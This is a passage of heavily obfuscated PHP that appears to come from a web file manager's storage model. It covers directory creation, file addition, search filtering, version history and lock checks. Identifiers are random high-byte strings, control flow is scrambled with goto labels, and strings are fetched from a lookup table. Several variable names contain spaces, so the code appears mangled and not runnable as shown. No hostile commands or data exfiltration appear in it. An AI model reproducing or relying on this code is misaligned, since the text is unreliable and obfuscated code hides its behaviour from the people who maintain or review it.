(isset($cµø´­Üˆ[$AÃ¼Ê¯Ü”ù[561]]) && $cµø´­Üˆ[$AÃ¼Ê¯Ü”ù[561]] != $CËœÇçƒ¾ö[$AÃ¼Ê¯Ü”ù[432]]) { return !1; } return !0; goto a†Òøõñ‡; AÖà³ëĞÀè: $AÃ¼Ê¯Ü”ù =& $_SERVER[´¬]; $b˜Â ÇëÓŠ = $CËœÇçƒ¾ö[$AÃ¼Ê¯Ü”ù[401]] == $AÃ¼Ê¯Ü”ù[87]; if (!strstr($CËœÇçƒ¾ö[$AÃ¼Ê¯Ü”ù[485]], $AÃ¼Ê¯Ü”ù[47] . $cµø´­Üˆ[$AÃ¼Ê¯Ü”ù[476]] . $AÃ¼Ê¯Ü”ù[47])) { return !1; } goto eŸ…‹‚âùË; eŸ…‹‚âùË: if (isset($cµø´­Üˆ[$AÃ¼Ê¯Ü”ù[403]]) && $cµø´­Üˆ[$AÃ¼Ê¯Ü”ù[403]] != $AÃ¼Ê¯Ü”ù[1739]) { if ($cµø´­Üˆ[$AÃ¼Ê¯Ü”ù[403]] == $AÃ¼Ê¯Ü”ù[77] && !$b˜Â ÇëÓŠ) { return !1; } if ($cµø´­Üˆ[$AÃ¼Ê¯Ü”ù[403]] != $AÃ¼Ê¯Ü”ù[77] && $b˜Â ÇëÓŠ) { return !1; } if (!strstr($CËœÇçƒ¾ö[$AÃ¼Ê¯Ü”ù[168]], $AÃ¼Ê¯Ü”ù[47] . $cµø´­Üˆ[$AÃ¼Ê¯Ü”ù[403]] . $AÃ¼Ê¯Ü”ù[47])) { return !1; } } if (isset($cµø´­Üˆ[$AÃ¼Ê¯Ü”ù[1935]]) && $cµø´­Üˆ[$AÃ¼Ê¯Ü”ù[1935]] < $CËœÇçƒ¾ö[$AÃ¼Ê¯Ü”ù[78]]) { return !1; } if (isset($cµø´­Üˆ[$AÃ¼Ê¯Ü”ù[1936]]) && $cµø´­Üˆ[$AÃ¼Ê¯Ü”ù[1936]] > $CËœÇçƒ¾ö[$AÃ¼Ê¯Ü”ù[78]]) { return !1; } goto E›¯£ºò¥; a†Òøõñ‡: } public function listSearchChildren($Aø®‚ôğ™½, $FœŞµ“êé‚ = 5000) { goto fëõ…ôİà˜; fëõ…ôİà˜: $dÒæºÏìö =& $_SERVER[´¬]; $bĞÏªÅçßî = array(); $Bó×§Š‚ = $this->sourceInfo($Aø®‚ôğ™½); goto bòìŸí¾¿; bòìŸí¾¿: $e–³äÅ«Ù = array($dÒæºÏìö[485] => array($dÒæºÏìö[379], $Bó×§Š‚[$dÒæºÏìö[485]] . $Bó×§Š‚[$dÒæºÏìö[394]] . $dÒæºÏìö[512])); $eÅÜÒ½¾¸… = $this->field($dÒæºÏìö[394])->cache(null, 600)->where($e–³äÅ«Ù)->count(); if ($eÅÜÒ½¾¸… > $FœŞµ“êé‚) { return $this->_listSearchChildrenNear($Aø®‚ôğ™½, $FœŞµ“êé‚); } goto FÕ™Ş¸†Œ; FÕ™Ş¸†Œ: $C“µª¼ÂŒ… = $this->field($dÒæºÏìö[394])->where($e–³äÅ«Ù)->select(); $bĞÏªÅçßî = array_to_keyvalue($C“µª¼ÂŒ…, $dÒæºÏìö[33], $dÒæºÏìö[394]); return $bĞÏªÅçßî; goto Fó«…Åß»ö; Fó«…Åß»ö: } private function _listSearchChildrenNear($bí¼«ªõ‡², $e»‡ğÏŠÍ) { goto b•ƒ‡ğ´Ò„; b•ƒ‡ğ´Ò„: $eÆùİùéå =& $_SERVER[´¬]; $E²ĞÊª¼‚ª = array(); $B¾¯¬âšå = array($eÆùİùéå[476] => $bí¼«ªõ‡²); goto cšÈ¼¡âëõ; cšÈ¼¡âëõ: $AéåÂÍ–ë = $this->field($eÆùİùéå[1937])->where($B¾¯¬âšå)->select(); $E×÷Ğšµ™å = array_to_keyvalue(array_filter_by_field($AéåÂÍ–ë, $eÆùİùéå[401], $eÆùİùéå[87]), $eÆùİùéå[33], $eÆùİùéå[394]); $E²ĞÊª¼‚ª = array_merge($E²ĞÊª¼‚ª, array_to_keyvalue($AéåÂÍ–ë, $eÆùİùéå[33], $eÆùİùéå[394])); goto a‰“Ğğ¥™Î; fê÷à‚: $E²ĞÊª¼‚ª = array_merge($E²ĞÊª¼‚ª, array_to_keyvalue($AéåÂÍ–ë, $eÆùİùéå[33], $eÆùİùéå[394])); $E²ĞÊª¼‚ª = array_slice($E²ĞÊª¼‚ª, 0, $e»‡ğÏŠÍ); return $E²ĞÊª¼‚ª; goto eÇôøéè°¨; a‰“Ğğ¥™Î: if (!$E×÷Ğšµ™å) { return $E²ĞÊª¼‚ª; } $B¾¯¬âšå = array($eÆùİùéå[476] => array($eÆùİùéå[7], $E×÷Ğšµ™å)); $AéåÂÍ–ë = $this->field($eÆùİùéå[1937])->where($B¾¯¬âšå)->limit($e»‡ğÏŠÍ)->select(); goto fê÷à‚; eÇôøéè°¨: } private function _listSearchBindPinyin($Eõ•ŒÃÁ¬’, &$d·Ø„õëù¶, &$aë¦¤¿Ä£) { goto bñÊÁßÉ’í; e´ÙÒ ¿™‚: $DÀãÚ‹Íˆ = "\x4c\x45\x46\124\40\112\x4f\x49\116\x20{$this->tablePrefix}\x69\157\137\x73\x6f\165\162\143\145\x5f\155\145\x74\x61\40\155\x65\164\141\40\157\156\x20\x73\157\165\162\143\145\56\163\157\165\162\x63\x65\x49\x44\x20\75\x20\155\x65\164\x61\x2e\x73\157\x75\x72\143\145\111\104"; $DæÉ¢‚“§Ğ = array(); $aë¦¤¿Ä£ = str_replace(array($dÏ¢ø¤§…Æ[228], $dÏ¢ø¤§…Æ[50], $dÏ¢ø¤§…Æ[1938]), $dÏ¢ø¤§…Æ[33], $aë¦¤¿Ä£); goto fÂÔ©ÄĞÓŸ; bù™ ÑË¢: $d·Ø„õëù¶ = $DæÉ¢‚“§Ğ; goto Dñ¡ÊÈØä½; a‘Õ‘Œ‰¢: foreach ($d·Ø„õëù¶ as $bŞÚ«®ˆ± => $E„‚Ã»‡‡ù) { $DæÉ¢‚“§Ğ[$dÏ¢ø¤§…Æ[1939] . $bŞÚ«®ˆ±] = $E„‚Ã»‡‡ù; } foreach ($Bé»×¥ğİŒ as $a¶ £ÚÛÏÒ) { $DæÉ¢‚“§Ğ[] = array($dÏ¢ø¤§…Æ[1941] => $a¶ £ÚÛÏÒ, $dÏ¢ø¤§…Æ[958] => $dÏ¢ø¤§…Æ[1776], array($dÏ¢ø¤§…Æ[1942] => $a¶ £ÚÛÏÒ, $dÏ¢ø¤§…Æ[1943] => array($dÏ¢ø¤§…Æ[7], array($dÏ¢ø¤§…Æ[442], $dÏ¢ø¤§…Æ[441])))); } $this->join($DÀãÚ‹Íˆ); goto bù™ ÑË¢; fÂÔ©ÄĞÓŸ: $aë¦¤¿Ä£ = $dÏ¢ø¤§…Æ[1939] . str_replace($dÏ¢ø¤§…Æ[47], $dÏ¢ø¤§…Æ[1940], $aë¦¤¿Ä£); $Bé»×¥ğİŒ = $d·Ø„õëù¶[$dÏ¢ø¤§…Æ[28]]; unset($d·Ø„õëù¶[$dÏ¢ø¤§…Æ[28]]); goto a‘Õ‘Œ‰¢; bñÊÁßÉ’í: $dÏ¢ø¤§…Æ =& $_SERVER[´¬]; if (!isset($Eõ•ŒÃÁ¬’[$dÏ¢ø¤§…Æ[1772]]) || !$Eõ•ŒÃÁ¬’[$dÏ¢ø¤§…Æ[1772]]) { return; } if (!Input::check($Eõ•ŒÃÁ¬’[$dÏ¢ø¤§…Æ[1772]], $dÏ¢ø¤§…Æ[315]) || strlen($Eõ•ŒÃÁ¬’[$dÏ¢ø¤§…Æ[1772]]) < 2) { return; } goto e´ÙÒ ¿™‚; Dñ¡ÊÈØä½: } private function _parseSearchWhere($f…ÊÏÍÂƒó) { goto FÑš†²“ï; a¨·©Š¶é: if (isset($f…ÊÏÍÂƒó[$e‹ªƒ¨®ó“[474]]) && $f…ÊÏÍÂƒó[$e‹ªƒ¨®ó“[474]]) { $dº…æ£ÃÚ = array($e‹ªƒ¨®ó“[1945], $f…ÊÏÍÂƒó[$e‹ªƒ¨®ó“[474]]); if ($eÒ¿–ÃÓ»µ[$e‹ªƒ¨®ó“[84]]) { $eÒ¿–ÃÓ»µ[$e‹ªƒ¨®ó“[84]] = array($eÒ¿–ÃÓ»µ[$e‹ªƒ¨®ó“[84]], $dº…æ£ÃÚ, $e‹ªƒ¨®ó“[1946]); } else { $eÒ¿–ÃÓ»µ[$e‹ªƒ¨®ó“[84]] = $dº…æ£ÃÚ; } } if (isset($f…ÊÏÍÂƒó[$e‹ªƒ¨®ó“[1935]]) && $f…ÊÏÍÂƒó[$e‹ªƒ¨®ó“[1935]] > 0) { $eÒ¿–ÃÓ»µ[$e‹ªƒ¨®ó“[78]] = array($e‹ªƒ¨®ó“[1944], $f…ÊÏÍÂƒó[$e‹ªƒ¨®ó“[1935]]); } if (isset($f…ÊÏÍÂƒó[$e‹ªƒ¨®ó“[1936]]) && $f…ÊÏÍÂƒó[$e‹ªƒ¨®ó“[1936]]) { $dº…æ£ÃÚ = array($e‹ªƒ¨®ó“[1945], $f…ÊÏÍÂƒó[$e‹ªƒ¨®ó“[1936]]); if ($eÒ¿–ÃÓ»µ[$e‹ªƒ¨®ó“[78]]) { $eÒ¿–ÃÓ»µ[$e‹ªƒ¨®ó“[78]] = array($eÒ¿–ÃÓ»µ[$e‹ªƒ¨®ó“[78]], $dº…æ£ÃÚ, $e‹ªƒ¨®ó“[1946]); } else { $eÒ¿–ÃÓ»µ[$e‹ªƒ¨®ó“[78]] = $dº…æ£ÃÚ; } } goto DÍå“à¤¹…; cÅ°Œ²­œ”: if (isset($f…ÊÏÍÂƒó[$e‹ªƒ¨®ó“[1772]]) && trim($f…ÊÏÍÂƒó[$e‹ªƒ¨®ó“[1772]])) { $D®Äø¥ô¥Ş = trim($f…ÊÏÍÂƒó[$e‹ªƒ¨®ó“[1772]]); $bµè›¹á®¯ = explode($e‹ªƒ¨®ó“[50], $D®Äø¥ô¥Ş); if (strlen($D®Äø¥ô¥Ş) > 2 && (substr($D®Äø¥ô¥Ş, 0, 1) == $e‹ªƒ¨®ó“[116] && substr($D®Äø¥ô¥Ş, -1) == $e‹ªƒ¨®ó“[116]) || substr($D®Äø¥ô¥Ş, 0, 1) == $e‹ªƒ¨®ó“[55] && substr($D®Äø¥ô¥Ş, -1) == $e‹ªƒ¨®ó“[55]) { $D®Äø¥ô¥Ş = substr($D®Äø¥ô¥Ş, 1, -1); $bµè›¹á®¯ = array($D®Äø¥ô¥Ş); } $eÒ¿–ÃÓ»µ[$e‹ªƒ¨®ó“[28]] = array(array($e‹ªƒ¨®ó“[511], $e‹ªƒ¨®ó“[1774] . $D®Äø¥ô¥Ş . $e‹ªƒ¨®ó“[1774])); if (count($bµè›¹á®¯) > 1) { $eÒ¿–ÃÓ»µ[$e‹ªƒ¨®ó“[28]] = array(); foreach ($bµè›¹á®¯ as $f£Î÷Óš¤â) { if (!trim($f£Î÷Óš¤â)) { continue; } $eÒ¿–ÃÓ»µ[$e‹ªƒ¨®ó“[28]][] = array($e‹ªƒ¨®ó“[511], $e‹ªƒ¨®ó“[1774] . trim($f£Î÷Óš¤â) . $e‹ªƒ¨®ó“[1774]); } } } return $eÒ¿–ÃÓ»µ; goto D‹ª‰ÛÕ„÷; DÍå“à¤¹…: if (isset($f…ÊÏÍÂƒó[$e‹ªƒ¨®ó“[561]]) && $f…ÊÏÍÂƒó[$e‹ªƒ¨®ó“[561]]) { $eÒ¿–ÃÓ»µ[] = array($e‹ªƒ¨®ó“[432] => $f…ÊÏÍÂƒó[$e‹ªƒ¨®ó“[561]], $e‹ªƒ¨®ó“[430] => $f…ÊÏÍÂƒó[$e‹ªƒ¨®ó“[561]], $e‹ªƒ¨®ó“[958] => $e‹ªƒ¨®ó“[1776]); } if (isset($f…ÊÏÍÂƒó[$e‹ªƒ¨®ó“[403]]) && $f…ÊÏÍÂƒó[$e‹ªƒ¨®ó“[403]]) { $fÈ‹¨®ø«Ÿ = $f…ÊÏÍÂƒó[$e‹ªƒ¨®ó“[403]]; if ($fÈ‹¨®ø«Ÿ == $e‹ªƒ¨®ó“[77]) { $eÒ¿–ÃÓ»µ[$e‹ªƒ¨®ó“[401]] = 1; } else { if ($fÈ‹¨®ø«Ÿ == $e‹ªƒ¨®ó“[1947]) { $eÒ¿–ÃÓ»µ[$e‹ªƒ¨®ó“[401]] = 0; } else { if ($fÈ‹¨®ø«Ÿ) { $fÈ‹¨®ø«Ÿ = is_array($fÈ‹¨®ø«Ÿ) ? $fÈ‹¨®ø«Ÿ : explode($e‹ªƒ¨®ó“[47], $fÈ‹¨®ø«Ÿ); $eÒ¿–ÃÓ»µ[$e‹ªƒ¨®ó“[403]] = array($e‹ªƒ¨®ó“[409], $fÈ‹¨®ø«Ÿ); $eÒ¿–ÃÓ»µ[$e‹ªƒ¨®ó“[401]] = 0; } } } } if (isset($f…ÊÏÍÂƒó[$e‹ªƒ¨®ó“[476]]) && $f…ÊÏÍÂƒó[$e‹ªƒ¨®ó“[476]]) { $d ÚÚŠÈîÂ = $this->sourceInfo($f…ÊÏÍÂƒó[$e‹ªƒ¨®ó“[476]]); $eÒ¿–ÃÓ»µ[$e‹ªƒ¨®ó“[552]] = array($e‹ªƒ¨®ó“[511], $d ÚÚŠÈîÂ[$e‹ªƒ¨®ó“[485]] . $f…ÊÏÍÂƒó[$e‹ªƒ¨®ó“[476]] . $e‹ªƒ¨®ó“[512]); } goto cÅ°Œ²­œ”; FÑš†²“ï: $e‹ªƒ¨®ó“ =& $_SERVER[´¬]; $eÒ¿–ÃÓ»µ = array(); if (isset($f…ÊÏÍÂƒó[$e‹ªƒ¨®ó“[721]]) && $f…ÊÏÍÂƒó[$e‹ªƒ¨®ó“[721]]) { $eÒ¿–ÃÓ»µ[$e‹ªƒ¨®ó“[84]] = array($e‹ªƒ¨®ó“[1944], $f…ÊÏÍÂƒó[$e‹ªƒ¨®ó“[721]]); } goto a¨·©Š¶é; D‹ª‰ÛÕ„÷: } } class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($cõ‡‘İõò) { $BÈ˜ø Ïœ˜ =& $_SERVER[´¬]; $dÂƒÂ®ñ” = Model($BÈ˜ø Ïœ˜[501])->where(array($BÈ˜ø Ïœ˜[1518] => $cõ‡‘İõò))->find(); $E”œ…¯…¥¯ = $this->_mkdirRoot(SourceModel::TYPE_USER, $cõ‡‘İõò, $dÂƒÂ®ñ”[$BÈ˜ø Ïœ˜[28]]); $this->userDesktopAdd($E”œ…¯…¥¯); return $E”œ…¯…¥¯; } public function userDesktopAdd($Bù‚°òãºö) { $a­¼£‚ÎÄÄ =& $_SERVER[´¬]; $cëÚõµèƒ÷ = LNG($a­¼£‚ÎÄÄ[1948]); $C£ŞŒ‰Ê® = $this->mkdir($Bù‚°òãºö, $cëÚõµèƒ÷); $this->metaSet($C£ŞŒ‰Ê®, $a­¼£‚ÎÄÄ[1949], $a­¼£‚ÎÄÄ[87]); $this->metaSet($Bù‚°òãºö, $a­¼£‚ÎÄÄ[1950], $C£ŞŒ‰Ê®); } public function groupRootAdd($dº³Ù·ù‘¬) { $Eò’—è£¢ =& $_SERVER[´¬]; $cˆœÌÕƒ„À = Model($Eò’—è£¢[484])->where(array($Eò’—è£¢[1767] => $dº³Ù·ù‘¬))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $dº³Ù·ù‘¬, $cˆœÌÕƒ„À[$Eò’—è£¢[28]]); } public function systemRootPathAdd($EÂÌùŒ¿ò) { if ($EÂÌùŒ¿ò != $_SERVER[´¬][504]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $EÂÌùŒ¿ò); } public function userRootRemove($AåÄ¯„à‘Ï) { $fë´ äİö = $this->sourceRoot(SourceModel::TYPE_USER, $AåÄ¯„à‘Ï); if (!$fë´ äİö) { return; } $this->remove($fë´ äİö, !1); } public function groupRootRemove($AÛõ‘Å›¤ç) { $aî‡Ë–‹¡Ò = $this->sourceRoot(SourceModel::TYPE_GROUP, $AÛõ‘Å›¤ç); if (!$aî‡Ë–‹¡Ò) { return; } $this->remove($aî‡Ë–‹¡Ò, !1); } private function _mkdirRoot($fÒœİ¿»ìâ, $d¢À•ëÛß, $a—öµ¾¢Ãº) { goto DíÚ˜¨éÖ©; DíÚ˜¨éÖ©: $c‰Áõ½İñŸ =& $_SERVER[´¬]; $Bö®Ê™ˆ‘Ø = array($c‰Áõ½İñŸ[393] => 0, $c‰Áõ½İñŸ[548] => $fÒœİ¿»ìâ, $c‰Áõ½İñŸ[549] => $d¢À•ëÛß, $c‰Áõ½İñŸ[545] => 1, $c‰Áõ½İñŸ[550] => USER_ID, $c‰Áõ½İñŸ[551] => USER_ID, $c‰Áõ½İñŸ[546] => $c‰Áõ½İñŸ[33], $c‰Áõ½İñŸ[552] => $c‰Áõ½İñŸ[497], $c‰Áõ½İñŸ[420] => 0, $c‰Áõ½İñŸ[547] => 0, $c‰Áõ½İñŸ[446] => 0, $c‰Áõ½İñŸ[553] => $c‰Áõ½İñŸ[33]); if ($aµä»òó÷¥ = $this->where($Bö®Ê™ˆ‘Ø)->find()) { return $aµä»òó÷¥[$c‰Áõ½İñŸ[394]]; } goto B­ÈÄ‰«; cæÊá¿¢¿: $cŞ÷»Ù…ÉŸ = $this->add($Bö®Ê™ˆ‘Ø); $eÜ½Ïì²à» = array($c‰Áõ½İñŸ[554] => short_id($cŞ÷»Ù…ÉŸ)); $this->where(array($c‰Áõ½İñŸ[408] => $cŞ÷»Ù…ÉŸ))->save($eÜ½Ïì²à»); goto F“°òËÎ‡; B­ÈÄ‰«: $A„¢®¾‹İ = "\115\157\144\x65\154\x53\x6f\165\162\x63\x65\56\155\153\x64\x69\162\x52\157\157\x74\56{$fÒœİ¿»ìâ}\x2e{$d¢À•ëÛß}\x2e" . $a—öµ¾¢Ãº; CacheLock::lock($A„¢®¾‹İ); $Bö®Ê™ˆ‘Ø[$c‰Áõ½İñŸ[28]] = $a—öµ¾¢Ãº; goto cæÊá¿¢¿; F“°òËÎ‡: CacheLock::unlock($A„¢®¾‹İ); return $cŞ÷»Ù…ÉŸ; goto a´™‰¬™È¬; a´™‰¬™È¬: } private function sourceRoot($eù«’Èù‚´, $b´íÍŒ­É›, $bğŸñò£„ = false) { $bßÛÁèÇ¸ =& $_SERVER[´¬]; $DÉ–ˆ‡¨ˆ = array($bßÛÁèÇ¸[393] => 0, $bßÛÁèÇ¸[548] => $eù«’Èù‚´, $bßÛÁèÇ¸[549] => $b´íÍŒ­É›); if ($Eê†ğ‰µ½ã = $this->where($DÉ–ˆ‡¨ˆ)->find()) { return $bğŸñò£„ ? $Eê†ğ‰µ½ã : $Eê†ğ‰µ½ã[$bßÛÁèÇ¸[394]]; } return !1; } public function sourceRootGroup($aÌ£áæßï) { goto dÎàğ­Ã«À; c·É“Œù•: return array_to_keyvalue($DÅ¶ˆ¬«Ó²[$CÂ„¯“ñË—[75]], $CÂ„¯“ñË—[482]); goto b—Å¹º‡ã‚; dÎàğ­Ã«À: $CÂ„¯“ñË— =& $_SERVER[´¬]; if (is_string($aÌ£áæßï)) { $aÌ£áæßï = array($aÌ£áæßï); } $EªĞçÖ¯Ç´ = array($CÂ„¯“ñË—[393] => 0, $CÂ„¯“ñË—[548] => SourceModel::TYPE_GROUP, $CÂ„¯“ñË—[549] => array($CÂ„¯“ñË—[7], $aÌ£áæßï)); goto F‹Ÿß…ÊíĞ; F‹Ÿß…ÊíĞ: $this->selectPageReset(); $DÅ¶ˆ¬«Ó² = $this->listSource($EªĞçÖ¯Ç´, 1000); $this->selectPageRestore(); goto c·É“Œù•; b—Å¹º‡ã‚: } public function mkfile($eÅĞª«ÃºŸ, $dò¥óÜÂ›, $f¢ËĞ×ŒÔ‚ = '', $BÓ°¥ÓÇ¤ = REPEAT_RENAME) { $b¸×§Ìë¯ =& $_SERVER[´¬]; $A·Íô¶™÷ = Model($b¸×§Ìë¯[570])->addFileByContent($f¢ËĞ×ŒÔ‚, $dò¥óÜÂ›); return $this->_createFileCall($eÅĞª«ÃºŸ, $dò¥óÜÂ›, $A·Íô¶™÷, $BÓ°¥ÓÇ¤, $b¸×§Ìë¯[1216]); } public function addFile($fÁƒíá‰¢¿, $F›ÖÍ†È¬ó, $CƒÇÍÆ„Ê£, $eÒŞí°‹Æ® = false, $fçßÎø¾¾ = REPEAT_RENAME) { $A‡–İ—ä¬Å = Model($_SERVER[´¬][570])->addFile($F›ÖÍ†È¬ó, $CƒÇÍÆ„Ê£, $eÒŞí°‹Æ®); return $this->_createFileCall($fÁƒíá‰¢¿, $CƒÇÍÆ„Ê£, $A‡–İ—ä¬Å, $fçßÎø¾¾); } public function addFileByFileID($dà¸‰Í¤Ÿ“, $b‹œ‡ç„ƒ¢, $fÖÑ±‡ïää, $bìà…†ñ½Ñ = REPEAT_RENAME) { $CÉæ¶Ó’á =& $_SERVER[´¬]; $e›‡«¾ÁÇ« = Model($CÉæ¶Ó’á[570])->find($b‹œ‡ç„ƒ¢); Model($CÉæ¶Ó’á[570])->linkAdd($b‹œ‡ç„ƒ¢); return $this->_createFileCall($dà¸‰Í¤Ÿ“, $fÖÑ±‡ïää, $e›‡«¾ÁÇ«, $bìà…†ñ½Ñ); } public function addFileByRemote($bœ‡¢ÎÃãù, $cµÔ„Ûù÷â, $AÏ‚‹¤ºöÚ, $bÕ˜‘ÌÃ  = array(), $CÄ¾õÃô­– = REPEAT_RENAME) { $B÷ˆÏ¶ = Model($_SERVER[´¬][570])->addFileByRemote($cµÔ„Ûù÷â, $AÏ‚‹¤ºöÚ, $bÕ˜‘ÌÃ ); return $this->_createFileCall($bœ‡¢ÎÃãù, $AÏ‚‹¤ºöÚ, $B÷ˆÏ¶, $CÄ¾õÃô­–); } private function _createFileCall($eÓ™“Öì¸», $fçš½×Åºª, $eÓéÈòß×, $FÁõ™­ò›, $A¸—Ì¯‘âì = "\x75\x70\154\157\x61\144") { goto cØñ”…ŒŒŠ; cØñ”…ŒŒŠ: $Dö´çƒéì¬ =& $_SERVER[´¬]; $aÇ¥Ÿ–Ùˆ = !1; $this->lockWriteStart($eÓ™“Öì¸», $fçš½×Åºª); goto bëŒˆ‚…ƒ; bëŒˆ‚…ƒ: $F®„Ñ»ßµ = $this->fileNameExist($eÓ™“Öì¸», $fçš½×Åºª); $F»ÅÆëë¿ƒ = $this->_createFile($eÓ™“Öì¸», $fçš½×Åºª, $eÓéÈòß×, $FÁõ™­ò›, $aÇ¥Ÿ–Ùˆ); if (!$aÇ¥Ÿ–Ùˆ) { Model($Dö´çƒéì¬[448])->remove($eÓéÈòß×[$Dö´çƒéì¬[445]]); } goto aí“ñÃÀï—; aí“ñÃÀï—: if ($aÇ¥Ÿ–Ùˆ && $F»ÅÆëë¿ƒ && $F»ÅÆëë¿ƒ != $F®„Ñ»ßµ) { Model($Dö´çƒéì¬[1919])->eventCreate($F»ÅÆëë¿ƒ, $A¸—Ì¯‘âì); } $this->lockWriteEnd($eÓ™“Öì¸», $fçš½×Åºª); return $F»ÅÆëë¿ƒ; goto fğÂ¿¥¹©; fğÂ¿¥¹©: } public function mkdir($bİÈÍæï, $F„¶ñ÷„Š, $c¸”ê«ô”µ = REPEAT_SKIP) { goto b­È©ÎóØ; DòÔ¸‡âÉê: $EÅàœ±øª¡ = $this->_addSoure($E‚¹•öõ¬, $cÌà¬ÒšïÍ); Model($eŠõõÔó«[1919])->eventCreate($EÅàœ±øª¡, $eŠõõÔó«[1217]); $this->lockWriteEnd($bİÈÍæï, $F„¶ñ÷„Š); goto EÈÚìË«”É; AŸÜ©ÊĞ­Œ: $this->lockWriteStart($bİÈÍæï, $F„¶ñ÷„Š); if ($c¸”ê«ô”µ !== !1) { $Bñà•“µÇ = $this->fileNameExist($bİÈÍæï, $F„¶ñ÷„Š); if ($Bñà•“µÇ && $c¸”ê«ô”µ != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($bİÈÍæï, $F„¶ñ÷„Š); return $Bñà•“µÇ; } $F„¶ñ÷„Š = $this->fileNameAuto($bİÈÍæï, $F„¶ñ÷„Š, $c¸”ê«ô”µ); } $E‚¹•öõ¬ = array($eŠõõÔó«[545] => 1, $eŠõõÔó«[411] => $F„¶ñ÷„Š, $eŠõõÔó«[546] => $eŠõõÔó«[33], $eŠõõÔó«[446] => 0, $eŠõõÔó«[547] => 0); goto DòÔ¸‡âÉê; EÈÚìË«”É: return $EÅàœ±øª¡; goto A¬Å‡ò‡­; b­È©ÎóØ: $eŠõõÔó« =& $_SERVER[´¬]; $cÌà¬ÒšïÍ = $this->sourceInfo($bİÈÍæï); if (!$cÌà¬ÒšïÍ) { return !1; } goto AŸÜ©ÊĞ­Œ; A¬Å‡ò‡­: } private function _createFile($d–»îæôß, $eñÔ¤¯²Â¼, $CÕ„½Ÿ§“Î, $c°§ÒêßÇ, &$FÚùîŠĞğÕ) { goto b‚ùïŞªŒÑ; añÔ÷ãİÓ: $DŒĞ£ñğ‰ = array($BùœÃ¶¬’‹[545] => 0, $BùœÃ¶¬’‹[411] => $eñÔ¤¯²Â¼, $BùœÃ¶¬’‹[546] => substr(get_path_ext($eñÔ¤¯²Â¼), 0, 10), $BùœÃ¶¬’‹[446] => $CÕ„½Ÿ§“Î[$BùœÃ¶¬’‹[445]], $BùœÃ¶¬’‹[547] => $CÕ„½Ÿ§“Î[$BùœÃ¶¬’‹[78]]); $C–İ²£¤Í = $this->_addSoure($DŒĞ£ñğ‰, $BíÄÜÁÔ±); $this->folderSizeReset($d–»îæôß, intval($DŒĞ£ñğ‰[$BùœÃ¶¬’‹[78]])); goto Dİ·Úéùê·; b…ˆæè¾«: if ($c°§ÒêßÇ !== !1) { $aªÊßİË‰ = $this->fileNameExist($d–»îæôß, $eñÔ¤¯²Â¼); } $FÚùîŠĞğÕ = !0; if ($c°§ÒêßÇ && $aªÊßİË‰) { if ($c°§ÒêßÇ == REPEAT_SKIP) { $FÚùîŠĞğÕ = !1; return $aªÊßİË‰; } else { if ($c°§ÒêßÇ == REPEAT_REPLACE) { $DªŒ»çÁé„ = $this->sourceInfo($aªÊßİË‰); $DÒíŸ¹Àƒ = $this->fileHistory($DªŒ»çÁé„, $CÕ„½Ÿ§“Î[$BùœÃ¶¬’‹[445]], $CÕ„½Ÿ§“Î[$BùœÃ¶¬’‹[78]]); if (!$DÒíŸ¹Àƒ) { $FÚùîŠĞğÕ = !1; } else { $this->folderSizeReset($d–»îæôß); } return $aªÊßİË‰; } else { $eñÔ¤¯²Â¼ = $this->fileNameAuto($d–»îæôß, $eñÔ¤¯²Â¼, $c°§ÒêßÇ, !1); } } } goto añÔ÷ãİÓ; Dİ·Úéùê·: return $C–İ²£¤Í; goto A¢—¼àã±; b‚ùïŞªŒÑ: $BùœÃ¶¬’‹ =& $_SERVER[´¬]; $BíÄÜÁÔ± = $this->sourceInfo($d–»îæôß); if (!$CÕ„½Ÿ§“Î || !$BíÄÜÁÔ±) { return !1; } goto b…ˆæè¾«; A¢—¼àã±: } protected function fileHistory($cÆš×˜ ¸à, $cÈ¡æ°ÔÃê, $eÖ¤Óˆ¼¥¨) { goto e²È™’óšå; e²È™’óšå: $e°Œ„­‡ÌÁ =& $_SERVER[´¬]; if ($cÆš×˜ ¸à[$e°Œ„­‡ÌÁ[445]] == $cÈ¡æ°ÔÃê) { return !1; } $this->checkLock($cÆš×˜ ¸à[$e°Œ„­‡ÌÁ[394]], $cÈ¡æ°ÔÃê); goto b—ØÓ«©™; FÄ„ÕèÜ¥‰: $this->sourceCacheClear($cÆš×˜ ¸à[$e°Œ„­‡ÌÁ[394]]); return !0; goto D¨¤ˆÕÏÄ; b—ØÓ«©™: Model($e°Œ„­‡ÌÁ[1951])->addHistory($cÆš×˜ ¸à); $dò…¬æŒŠ¬ = array($e°Œ„­‡ÌÁ[551] => USER_ID, $e°Œ„­‡ÌÁ[415] => time(), $e°Œ„­‡ÌÁ[445] => $cÈ¡æ°ÔÃê, $e°Œ„­‡ÌÁ[78] => $eÖ¤Óˆ¼¥¨); $this->where(array($e°Œ„­‡ÌÁ[408] => $cÆš×˜ ¸à[$e°Œ„­‡ÌÁ[394]]))->save($dò…¬æŒŠ¬); goto FÄ„ÕèÜ¥‰; D¨¤ˆÕÏÄ: } public function checkLock($aâÃê„½âŒ, $cóÆ¥ÔÜƒ) { goto F®ğŞŠÃİ—; Fá‘º¹¦¥¡: $this->_createFileCall($Døì§‰¿ÙÊ[$e¬™×ÉÄ¼[476]], $dçÆĞ‡®›Â, $d‹¥ñƒ™İ, REPEAT_REPLACE, $e¬™×ÉÄ¼[1216]); $d…ÖÍÜŠ‘‰ = $Døì§‰¿ÙÊ[$e¬™×ÉÄ¼[443]][$e¬™×ÉÄ¼[509]]; $c¿ç´»Ş—² = $d…ÖÍÜŠ‘‰[$e¬™×ÉÄ¼[1953]] ? $d…ÖÍÜŠ‘‰[$e¬™×ÉÄ¼[1953]] : $d…ÖÍÜŠ‘‰[$e¬™×ÉÄ¼[28]]; goto Bƒ±ãˆß¾Ò; Bƒ±ãˆß¾Ò: show_json(LNG($e¬™×ÉÄ¼[1954]) . $e¬™×ÉÄ¼[1955] . LNG($e¬™×ÉÄ¼[1956]) . $e¬™×ÉÄ¼[1957] . $c¿ç´»Ş—² . $e¬™×ÉÄ¼[1958], !1); goto FÑ÷©ŸÒ¦; F®ğŞŠÃİ—: $e¬™×ÉÄ¼ =& $_SERVER[´¬]; $Døì§‰¿ÙÊ = $this->pathInfo($aâÃê„½âŒ); if (!$this->fileIsLock($Døì§‰¿ÙÊ, !0)) { return; } goto A…ĞçÃ‹ñ; A…ĞçÃ‹ñ: 